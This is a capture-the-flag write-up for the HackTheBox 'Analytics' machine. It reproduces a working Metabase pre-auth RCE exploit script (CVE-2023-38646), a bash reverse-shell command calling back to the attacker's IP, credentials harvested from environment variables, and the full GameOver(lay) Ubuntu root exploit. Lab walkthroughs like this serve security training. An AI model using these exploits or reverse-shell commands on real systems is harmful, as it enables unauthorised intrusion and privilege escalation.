---
title: Analytics
tags:
  - HackTheBox
  - Easy
  - Linux
  - Metabase
  - Ubuntu
  - GameOverlay
date: 2024-09-05T00:00:00Z
---
![](Pasted%20image%2020241105225943.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.233 analytical.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- analytical.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
|_http-title: Analytical
```

So I checked its webpage:

![](Pasted%20image%2020241105230243.png)

I tried to check the login but I needed to add the subdomain `data.analytical.htb`:

![](Pasted%20image%2020241105230747.png)

After adding it, we get a Metabase login:

![](Pasted%20image%2020241105230942.png)

## Weaponization

I searched for "*Metabase exploit*" in google and found [CVE-2023-38646 Poc](https://github.com/m3m0o/metabase-pre-auth-rce-poc).
- You could also try [This exploit](https://www.exploit-db.com/exploits/51797)

```python
from argparse import ArgumentParser
from string import ascii_uppercase

import base64
import random
import requests


def encode_command_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload


parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a command through the security flaw described in CVE 2023-38646')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-t', '--token', type=str, required=True, help='Setup Token from /api/session/properties')
parser.add_argument('-c', '--command', type=str, required=True, help='Command to be execute in the target host')

args = parser.parse_args()

print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]\n')

print('[+] Initialized script')

print('[+] Encoding command')

command = encode_command_to_b64(args.command)

url = f'{args.url}/api/setup/validate'

headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

payload = {
    "token": args.token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+] Making request')

request = requests.post(url, json=payload, headers=headers)

print('[+] Payload sent')
```

## Exploitation

First, we must get the setup token (can be obtained under `/api/session/properties` endpoint):

![](Pasted%20image%2020241105231409.png)

In my case it's `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`.

Then I executed the script like:

```shell
python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.24/666 0>&1"
```

> Now we've got a reverse shell :D

![](Pasted%20image%2020241105231829.png)

## Lateral Movement

It seems that we are inside a container:

![](Pasted%20image%2020241105232148.png)

We can also see a `metabase.db` database, which could hide some credentials.

If we run `printenv` we can see the variables that were set:

```shell
printenv

[redacted]
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

> Now we've got credentials (that worked via ssh on the host machine :D). We can now read user flag!

![](Pasted%20image%2020241105232944.png)

## Privilege Escalation

We can obtain the kernel version of the OS with `uname -a`:

```shell
uname -a

Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linu
```

So as it is an Ubuntu, we can check the version of it and the release with `lsb_release -a`:

```shell
lsb_release -a

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

So if we search for "*Ubuntu jammy exploit*" we find [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629), also called **GameOver(lay)**:

```shell
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

> If we execute it we become root and can read root flag :D

![](Pasted%20image%2020241105235102.png)

==Machine pwned!==

